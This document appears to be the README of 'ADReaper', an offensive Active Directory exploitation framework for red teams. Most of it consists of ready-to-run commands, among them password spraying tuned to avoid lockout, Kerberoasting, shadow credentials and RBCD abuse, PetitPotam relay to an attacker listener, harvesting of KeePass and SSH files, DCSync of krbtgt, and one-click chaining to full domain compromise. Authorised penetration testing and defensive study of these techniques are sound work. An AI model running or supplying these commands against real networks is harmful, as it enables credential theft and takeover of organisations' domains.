# ⚔️ ADREAPER: Advanced Active Directory Exploitation Framework 🛡️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.5.0
```

**ADReaper** is a high-performance, expert-tier reconnaissance and offensive security framework. Engineered for portability and protocol fidelity, it provides Red Teams with the precision tools required to escalate from unauthenticated discovery to full domain compromise.

---

## 📑 Master Tactical Reference (Explained)

This section provides a deep-dive into every operational capability. Use these conjugations for rapid copy-paste deployment.

### 🔍 Infrastructure Reconnaissance (`infra`)

**Service Discovery & Fingerprinting**
The `infra scan` module is designed for rapid identification of Active Directory services.
- **Fast Scan**: Targets the most common AD ports (LDAP, SMB, Kerberos, RDP). Essential for mapping the attack surface without over-alerting EDR/IDS.
- **Full-Throttle**: Scans all 65,535 TCP ports. The `-Pn` flag skips host discovery (useful for hardened environments), and `-A` enables deep NetBIOS and LDAP RootDSE fingerprinting for exact OS detection.
- **DNS Recon**: Uses SRV records to find all Domain Controllers, Key Distribution Centers (KDCs), and Global Catalogs in the domain.

```powershell
# Fast service discovery (Primary AD ports)
.\adreaper.exe infra scan -t 10.10.1.5 --ports 88,135,389,445,636,3389

# Full-throttle scan (All 65k ports + Aggressive Fingerprinting + No-Ping)
.\adreaper.exe infra scan -t 10.10.1.5 -Pn -A --ports all -v

# AD Infrastructure discovery via DNS
.\adreaper.exe infra dns -d corp.local --dc-ip 10.10.1.5
```

---

### 👤 Identity & Object Intelligence (`enum`)

**LDAP Enumeration & Privilege Mapping**
The `enum` module extracts tactical intelligence directly from the Domain Controller.
- **Unauthenticated Recon**: Even without credentials, `enum domain` can often extract the domain's password policy, lockout threshold, and functional level.
- **Identity Hunting**: The `--spn-only` and `--asrep-only` flags specifically target accounts vulnerable to Kerberoasting and AS-REP roasting. `--admin-only` isolates accounts with `adminCount=1`, identifying high-value targets.
- **ACL & PKI Auditing**: `enum acls` searches for dangerous permissions (like `GenericAll` or `WriteDacl`) over high-value objects. `enum adcs` analyzes Certificate Authorities and templates to find paths for certificate-based impersonation (ESC1-ESC8).

```powershell
# Unauthenticated Domain Recon (Policy & Functional Levels)
.\adreaper.exe enum domain -d corp.local --dc-ip 10.10.1.5

# Identity Hunting (SPNs + AS-REP Exposure + Administrative Count)
.\adreaper.exe enum users --spn-only --asrep-only --admin-only -d corp.local

# Identity Hunting (Full attributes with credentials/hash)
.\adreaper.exe enum users -d corp.local -u user -p pass
.\adreaper.exe enum users -d corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Network Inventory (OS Versioning & LAPS status)
.\adreaper.exe enum computers --verbose -d corp.local -u user -p pass

# Privilege Mapping (Group Membership Analysis)
.\adreaper.exe enum groups --name "Domain Admins" -d corp.local -u user -p pass

# Advanced ACL Audit (Find GenericAll/WriteDACL on high-value objects)
.\adreaper.exe enum acls -d corp.local -u user -p pass

# PKI Analysis (Vulnerable Certificate Templates ESC1-ESC8)
.\adreaper.exe enum adcs -d corp.local -u user -p pass
```

---

### 🌳 SMB Cartography (`enum tree`)

**Recursive Share Mapping**
The `enum tree` module provides a visual representation of remote file systems.
- **Targeted Mapping**: Focuses on specific folders (like `/Policies` in SYSVOL) to find GPO files or scripts that might contain passwords.
- **Global Discovery**: The `-s all` flag is a powerhouse—it automatically discovers every share on the target and walks them all up to the specified `--depth`. This is the most efficient way to identify sensitive data (backups, configs, logs) across the entire target.

```powershell
# Map high-value folders in SYSVOL
.\adreaper.exe enum tree -s SYSVOL --path "/Policies" --depth 3 -d corp.local

# Global Share Mapping (Automatically discover and walk ALL accessible shares)
.\adreaper.exe enum tree -s all --depth 2 -d corp.local -u user -p pass
```

---

### ⚔️ Strategic Exploitation (`attack`)

**Lateral Movement & Credential Extraction**
The `attack` module contains weaponized logic for escalation.
- **Password Spraying**: The `--delay` flag is critical for bypassing lockout policies. This module uses Kerberos AS-REQ for stealthier validation than traditional LDAP binds.
- **Shadow Credentials & RBCD**: These represent the modern AD attack surface. `attack shadow` injects a public key into an object's `msDS-KeyCredentialLink`, while `attack rbcd` modifies delegation settings to allow a computer account you control to impersonate users to the target.
- **Relay Triggers**: Implements `petitpotam` and `printerbug` to force a machine to authenticate to your listener, capturing a machine NTLM hash for relaying to LDAP or SMB.
- **Loot Harvesting**: `attack harvest` recursively scans all shares for specific file extensions (e.g., `.kdbx` for KeePass or `.ssh` for keys) and downloads them to your workspace automatically.

```powershell
# Lockout-Aware Password Spraying
.\adreaper.exe attack spray -P "Winter2024!" -d corp.local --delay 5

# Ticket & Hash Extraction (Kerberoasting & AS-REP Roasting)
.\adreaper.exe attack kerberoast -d corp.local -u user -p pass -o hashes.txt
.\adreaper.exe attack asreproast -d corp.local -o asrep_hashes.txt

# Modern Escalation (Shadow Credentials & RBCD)
.\adreaper.exe attack shadow -t SQLSERVER01 -d corp.local -u user -p pass
.\adreaper.exe attack rbcd -t FILE-SRV -M ATTACKER_PC$ -u user -p pass

# NTLM Relay Triggers (PetitPotam & PrinterBug)
.\adreaper.exe attack relay -t DC01 -m petitpotam --listener 10.10.10.5

# Post-Compromise (GPP Decryption & Sensitive Data Harvesting)
.\adreaper.exe attack gpp -d corp.local -u user -p pass
.\adreaper.exe attack harvest -e kdbx,ssh,conf,xlsx,pdf -d corp.local -u user -p pass

# Domain Admin Operations (DCSync & SecretsDump)
.\adreaper.exe attack dcsync --user krbtgt -d corp.local -u admin -p pass
.\adreaper.exe attack secretsdump -d corp.local -u admin -p pass

# Advanced ACL Abuse (Force Change Password / Add SPN)
.\adreaper.exe attack acl-abuse --target victim_user --action reset-password --value "NewPassword123!"
```

---

### 🐕 Graph & Automation (`bloodhound` / `autopilot`)

**Analysis & Orchestration**
- **BloodHound**: The `collect` command gathers exhaustive telemetry (ACLs, GPOs, Sessions, containers) and generates JSON files compatible with BloodHound. `ingest` pushes this data directly into your Neo4j database.
- **Autopilot**: The ultimate "one-click" command. It chains every stage of an engagement—from infra recon and roasting to BloodHound collection and loot harvesting—culminating in a unified intelligence report.

```powershell
# Multi-collector Telemetry (GPOs, ACLs, OUs, Containers, etc.)
.\adreaper.exe bloodhound collect -d corp.local -u user -p pass

# Direct Ingestion to Neo4j
.\adreaper.exe bloodhound ingest --neo4j-uri bolt://127.0.0.1:7687 --neo4j-pass "YourPassword"

# Full Mission Automation (Recon → Roast → BH → Loot → Report)
.\adreaper.exe autopilot -d corp.local --dc-ip 10.10.1.5 -u user -p pass
```

---

## 🛡️ Operational Excellence

- **Protocol Purity**: No dependency on external binaries. ADReaper builds its own protocol frames for LDAP, SMB2, and Kerberos.
- **Threaded Precision**: High-speed worker pools ensure your enumeration is fast and responsive.
- **Evidence Management**: All artifacts are consolidated into the `workspace/` directory and visualized via the premium HTML dashboard.

---

**Crafted for precision. Optimized for results.** ⚔️🔥🚀
